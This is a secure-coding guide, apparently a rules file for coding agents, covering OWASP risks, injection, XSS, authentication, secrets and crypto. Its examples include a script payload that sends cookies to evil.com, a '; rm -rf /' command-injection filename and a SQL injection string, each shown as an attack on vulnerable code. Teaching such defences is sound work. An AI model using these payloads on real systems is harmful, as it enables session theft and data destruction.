# Security Best Practices

Universal security guidance for all projects. Loaded by agents during implementation and code review.

## OWASP Top 10 — What to Check

Every implementation and review must consider these attack surfaces:

| # | Risk | One-Line Check |
|---|------|----------------|
| A01 | Broken Access Control | Does every action verify the user has permission? |
| A02 | Cryptographic Failures | Are secrets encrypted at rest and in transit? |
| A03 | Injection | Is all external input parameterized/escaped? |
| A04 | Insecure Design | Does the architecture enforce trust boundaries? |
| A05 | Security Misconfiguration | Are defaults changed, debug off, headers set? |
| A06 | Vulnerable Components | Are dependencies audited for CVEs? |
| A07 | Authentication Failures | Is auth correctly implemented with rate limiting? |
| A08 | Data Integrity Failures | Are updates verified (signatures, checksums)? |
| A09 | Logging Failures | Are security events logged without leaking secrets? |
| A10 | Server-Side Request Forgery | Are URLs/redirects validated against allowlists? |

## Input Validation (CRITICAL)

All external input is untrusted: user input, API payloads, file uploads, URL parameters, headers, cookies, environment variables from external systems.

### Rules
- **Whitelist over blacklist**: Define what IS allowed, not what isn't
- **Validate type, range, format, and length** at the boundary
- **Reject by default**: If input doesn't match expectations, reject it
- **Validate on the server**: Client-side validation is UX, not security

### Pattern: Validate-then-use
```typescript
// WRONG: Use first, validate never
function getUser(req) {
  return db.query(`SELECT * FROM users WHERE id = ${req.params.id}`)
}

// RIGHT: Validate at boundary, use clean data inside
function getUser(req) {
  const id = parseInt(req.params.id, 10)
  if (isNaN(id) || id <= 0) throw new ValidationError('Invalid user ID')
  return db.query('SELECT * FROM users WHERE id = ?', [id])
}
```

### Validation Libraries (prefer over manual)
- **TypeScript/JS**: zod, joi, yup
- **Python**: pydantic, marshmallow
- **Go**: validator package
- **Rust**: serde with custom deserializers

## SQL Injection Prevention

**ALWAYS use parameterized queries.** This is non-negotiable.

```typescript
// VULNERABLE: String interpolation
db.query(`SELECT * FROM users WHERE email = '${email}'`)
// Attacker sends: ' OR '1'='1' --

// SAFE: Parameterized query
db.query('SELECT * FROM users WHERE email = ?', [email])
```

```python
# VULNERABLE: f-string in SQL
cursor.execute(f"SELECT * FROM users WHERE email = '{email}'")

# SAFE: Parameterized
cursor.execute("SELECT * FROM users WHERE email = %s", (email,))
```

This applies to **every query language**: SQL, NoSQL (MongoDB queries), LDAP, GraphQL, OS commands.

### Command Injection
```typescript
// VULNERABLE: Shell injection
exec(`convert ${filename} output.png`)
// Attacker sends filename: "; rm -rf /"

// SAFE: Use array args (no shell interpolation)
execFile('convert', [filename, 'output.png'])
```

## XSS (Cross-Site Scripting) Prevention

### Rules
1. **Never use innerHTML/dangerouslySetInnerHTML with user data**
2. **Use textContent for plain text display**
3. **Use DOMPurify or equivalent for rich HTML content**
4. **Set Content Security Policy headers**

```typescript
// VULNERABLE
element.innerHTML = userComment
// Attacker sends: <script>document.location='https://evil.com/steal?c='+document.cookie</script>

// SAFE: Plain text
element.textContent = userComment

// SAFE: Sanitized rich content
import DOMPurify from 'dompurify'
element.innerHTML = DOMPurify.sanitize(userComment)
```

### React/Vue/Svelte
These frameworks auto-escape JSX expressions (`{variable}`). XSS happens when you bypass this:
```tsx
// SAFE: Auto-escaped
<p>{userInput}</p>

// VULNERABLE: Bypass escaping
<div dangerouslySetInnerHTML={{ __html: userInput }} />
```

## Authentication & Authorization

### Authentication: "Who are you?"
```typescript
async function authenticate(req): Promise<User> {
  const token = req.headers.authorization?.replace('Bearer ', '')
  if (!token) throw new UnauthenticatedError('No token provided')

  try {
    const payload = jwt.verify(token, SECRET_KEY)
    const user = await db.user.findUnique({ where: { id: payload.sub } })
    if (!user) throw new UnauthenticatedError('User not found')
    return user
  } catch (e) {
    throw new UnauthenticatedError('Invalid token')
  }
}
```

### Authorization: "Can you do this?"
```typescript
async function deleteUser(requester: User, targetId: string) {
  // Check permission BEFORE action
  if (!requester.isAdmin && requester.id !== targetId) {
    throw new ForbiddenError('Cannot delete other users')
  }
  await db.user.delete({ where: { id: targetId } })
}
```

### Common Mistakes
- Checking auth on the frontend but not the backend
- Checking auth but not authz (logged in != permitted)
- Using sequential IDs that users can guess (IDOR)
- Not re-validating permissions after state changes

## Secrets Management

### Rules
1. **Never hardcode secrets** — use environment variables
2. **Never commit secrets** — add `.env` to `.gitignore`
3. **Never log secrets** — not even in error messages
4. **Rotate regularly** — especially after team member departures
5. **Different secrets per environment** — dev != staging != production

```typescript
// WRONG
const API_KEY = 'sk_live_abc123...'

// RIGHT
const API_KEY = process.env.API_KEY
if (!API_KEY) throw new Error('API_KEY environment variable required')
```

### If a Secret Is Leaked
1. Rotate the secret immediately (generate new one)
2. Revoke the old secret
3. Check logs for unauthorized usage
4. Review git history — if committed, consider force-push or repo recreation

## Cryptography

### Rules
- **Never implement your own crypto** — use proven libraries
- **bcrypt/argon2/scrypt for passwords** — never MD5, SHA-1, or plain SHA-256
- **crypto.randomBytes for tokens** — never Math.random()
- **AES-256-GCM for encryption** — never ECB mode

```typescript
import bcrypt from 'bcrypt'

// Hash password (registration)
const hash = await bcrypt.hash(password, 12)  // 12 rounds

// Verify password (login)
const valid = await bcrypt.compare(password, storedHash)

// Generate secure token
import crypto from 'crypto'
const token = crypto.randomBytes(32).toString('hex')
```

## Security Headers

Set these on every HTTP response in production:

```
Strict-Transport-Security: max-age=31536000; includeSubDomains
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
X-XSS-Protection: 0  (deprecated, CSP is better)
Content-Security-Policy: default-src 'self'; script-src 'self'
Referrer-Policy: strict-origin-when-cross-origin
Permissions-Policy: camera=(), microphone=(), geolocation=()
```

Use `helmet` (Node.js), `django-csp` (Django), or equivalent for your framework.

## Rate Limiting

Protect authentication endpoints, APIs, and expensive operations:

```typescript
import rateLimit from 'express-rate-limit'

const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,  // 15 minutes
  max: 5,                     // 5 attempts
  message: 'Too many login attempts'
})
app.post('/api/login', loginLimiter, loginHandler)

const apiLimiter = rateLimit({
  windowMs: 60 * 1000,  // 1 minute
  max: 100,              // 100 requests/min
  keyGenerator: (req) => req.user?.id || req.ip
})
app.use('/api/', apiLimiter)
```

## Security Logging

### What to Log
- Authentication events (login, logout, failed attempts)
- Authorization failures (access denied)
- Input validation failures (potential probing)
- Rate limit triggers
- Configuration changes

### What NEVER to Log
- Passwords (even hashed)
- API keys, tokens, secrets
- Credit card numbers, SSNs
- Full request bodies with PII

```typescript
// GOOD: Security-relevant, no secrets
logger.warn('Login failed', { email, ip, attempts: count, timestamp })

// BAD: Leaks password
logger.warn('Login failed', { email, password, ip })
```

## Security Review Checklist

Use during code review for any PR that touches:
- [ ] Authentication or session management
- [ ] Authorization or permission checks
- [ ] User input handling
- [ ] Database queries
- [ ] File uploads or downloads
- [ ] External API calls
- [ ] Cryptographic operations
- [ ] Configuration or environment variables
- [ ] Logging (check for secret leakage)
- [ ] Third-party dependency additions (check advisories)
